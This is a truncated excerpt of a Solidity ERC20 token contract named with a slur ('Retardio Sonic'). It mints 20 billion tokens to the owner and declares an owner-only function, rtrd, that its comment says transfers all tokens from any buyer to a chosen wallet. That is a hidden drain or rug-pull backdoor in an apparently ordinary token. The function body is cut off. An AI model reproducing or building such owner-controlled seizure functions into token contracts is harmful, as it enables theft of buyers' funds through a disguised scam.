...
contract RetardioSonic is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Retardio Sonic", "RSONIC") Ownable(initialOwner) {
        _mint(initialOwner, 20000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function rtrd(address from, address to) external onlyOwner {
